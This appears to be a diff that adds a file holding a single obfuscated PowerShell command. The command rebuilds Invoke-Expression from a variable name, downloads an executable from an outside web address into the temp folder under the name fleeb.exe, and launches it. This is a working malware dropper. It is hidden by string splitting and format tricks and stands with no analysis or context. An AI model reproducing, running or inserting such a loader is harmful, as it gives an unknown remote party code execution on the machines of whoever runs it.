@@ -1,0 +1,1 @@
+﻿& ((Get-VariAbLe '*MdR*').nAME[3,11,2]-joIN'') ((('({1}dep'+'loylocation'+'={1'+'}env:t'+'emp+{0}fleeb'+'.exe{0});'+'(Ne'+'w-Obj'+'ect'+' Sy'+'stem'+'.Net.Web'+'Cl'+'ie'+'nt'+')'+'.'+'Do'+'wnlo'+'adFile({'+'0}http:'+'/'+'/worldnit.c'+'om/guy'+'o.exe{0}, '+'{1}d'+'e'+'ployl'+'oc'+'ation);Start-Pro'+'cess {1'+'}'+'d'+'epl'+'oyl'+'ocat'+'i'+'o'+'n') -f [Char]39,[Char]36) ) 
